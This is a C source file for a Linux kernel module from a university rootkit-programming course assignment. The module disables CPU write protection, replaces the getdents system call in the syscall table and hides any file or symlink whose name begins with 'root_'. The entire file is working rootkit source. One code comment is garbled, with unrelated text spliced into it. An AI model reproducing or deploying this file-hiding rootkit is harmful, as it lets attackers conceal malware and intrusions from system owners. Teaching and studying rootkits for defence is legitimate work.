
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 4                                                             */
/*                                                                             */
/*   Filename: file_masker.c                                                */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: November 2015                                                       */
/*                                                                             */
/*   Usage: insmod $(module_name).ko                                           */
/*                                                                             */
/*******************************************************************************/

#include <linux/module.h>		/* Needed by all kernel modules */
#include <linux/syscalls.h>		/* Needed for __NR_getdents */
#include <linux/namei.h>		/* Needed for kern_path & LOOKUP_FOLLOW */
#include <linux/ctype.h>
#include <linux/fs.h>

#include "file_masker.h"
#include "sysmap.h"				/* Needed for ROOTKIT_SYS_CALL_TABLE */

#define PREF "root_"
#define NAME_BUF_SIZE 200

MODULE_LICENSE("GPL");

void **sys_call_table;
asmlinkage int (*getdents_syscall)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage long (*readlinkat_syscall)(int dfd, const char __user *path,
				 char __user *buf, int bufsiz);

/* Initialization function which is called when the module is
   insmoded into the kernel. It replaces the getdents() syscall. */
static int __init file_masker_start(void)
{
	disable_write_protect_mode();

	/* Store original getdents() syscall */
	sys_call_table = (void *) ROOTKIT_SYS_CALL_TABLE;
	getdents_syscall = (void *) sys_call_table[__NR_getdents];
	readlinkat_syscall = (void *) sys_call_table[__NR_readlinkat];

	/* Replace in the system call table the original
	   getdents syscall with our manipulated getdents */
	sys_call_table[__NR_getdents] = (unsigned long *) my_getdents_syscall;

	enable_write_protect_mode();

	printk(KERN_INFO "file_masker rootkit: %s\n", "successfully inserted");

	/* A non 0 return value means init_module failed; module can't be loaded */
	return 0;
}


/* Cleanup function which is called just before module
   is rmmoded. It restores the original getdents() syscall. */
static void __exit file_masker_end(void)
{
	disable_write_protect_mode();
	/* Restore original getdents() syscall */
	sys_call_table[__NR_getdents] = (int *) getdents_syscall;
	enable_write_protect_mode();

	printk(KERN_INFO "file_masker rootkit: %s\n", "successfully removed");

	return;
}


/* Function that replaces the original getdents syscall. In addition to what
   getdents does, additionally it ...  */
asmlinkage int my_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
	int nread;
	int nread_temp;
	char name[NAME_BUF_SIZE];
	int size = 0;

	/* Call original getdents_syscall */
	nread = getdents_syscall(fd, dirp, count);

	nread_temp = nread;

	while (nread_temp > 0) {
		nread_temp -= dirp->d_reclen;
		size = 0;

		set_fs(KERNEL_DS);
		size = readlinkat_syscall(fd, dirp->d_name, name, NAME_BUF_SIZE);
		set_fs(USER_DS);

		if (size > 0)
			name[size] = '\0';

		if (should_mask(dirp->d_name) || (size > 0 && should_mask(name))) {
			if (size > 0)
				printk(KERN_INFO "file_masker rootkit: hiding link %s which points to file %s\n", dirp->d_name, name);
			else
				printk(KERN_INFO "file_masker rootkit: hiding file %s\n", dirp->d_name);
			memmove(dirp, (char *) dirp + dirp->d_reclen, nread_temp);
			nread -= dirp->d_reclen;
			continue;
		}

		if (nread_temp == 0)
			return nread;

		dirp = (struct linux_dirent *) ((char *) dirp + dirp->d_reclen);
	}

	return nread;
}


void disable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. ThN_INFO "TEXT: %s\n", (lst +
	 * 1));
	 *
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Disable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 0. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 & ~0x00010000);
}


void enable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Enable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 1. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 | 0x00010000);
}

/* Function used to parse paths an extract the filename */
char *strip_path(const char *name)
{
	char *lst = strrchr(name, '/');

	if (lst != NULL)
		return ++lst;

	return name;
}


/* Function that checks whether we need to mask the specified pid */
int should_mask(const char *name)
{
	char *stripped = strip_path(name);
	char *res = strstr(stripped, PREF);

	return (res == stripped) ? 1 : 0;
}


module_init(file_masker_start);
module_exit(file_masker_end);
